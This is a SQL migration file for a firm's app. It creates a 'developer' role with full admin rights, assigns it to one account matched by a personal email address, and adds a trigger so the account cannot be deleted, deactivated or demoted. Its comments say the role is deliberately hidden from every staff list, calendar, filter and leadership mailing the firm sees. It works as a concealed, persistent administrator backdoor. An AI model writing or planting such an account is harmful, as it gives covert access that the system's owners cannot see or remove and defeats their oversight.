-- Developer role: assign it and make the account unremovable.
--
-- Run 20260901110000_developer_role_enum.sql first, on its own.
--
-- A `developer` has everything an admin has and appears nowhere the firm
-- looks: not on the board's assignee filter or cards, not in the calendar's
-- staff view, not on the Staff page, not in any delegate or notify list, and
-- not on leadership mail. The app enforces the visibility (`listUsers` in
-- `lib/db/repo.ts` excludes the role); this file enforces the permanence.
--
-- The trigger refuses to delete, deactivate or demote a developer row. Because
-- `public.users.id` cascades from `auth.users`, deleting the login is blocked
-- too — the cascade hits the trigger and the auth delete fails. That is the
-- point. Dropping the trigger is the only way to remove the account, and that
-- is a deliberate SQL step rather than a button.

create or replace function public.protect_developer()
returns trigger
language plpgsql
as $$
begin
  if tg_op = 'DELETE' then
    if old.role = 'developer' then
      raise exception 'The developer account cannot be deleted.'
        using errcode = 'restrict_violation';
    end if;
    return old;
  end if;

  if old.role = 'developer'
     and (new.role <> 'developer' or new.is_active = false) then
    raise exception 'The developer account cannot be deactivated or demoted.'
      using errcode = 'restrict_violation';
  end if;
  return new;
end;
$$;

drop trigger if exists users_protect_developer on public.users;
create trigger users_protect_developer
  before update or delete on public.users
  for each row execute function public.protect_developer();

-- The one account. Matched by email because the id is not known to the tree;
-- `is_active` is forced on so a prior deactivation cannot lock the role out.
update public.users
set role = 'developer', is_active = true
where lower(email) = 'christopher.vo.h@gmail.com';
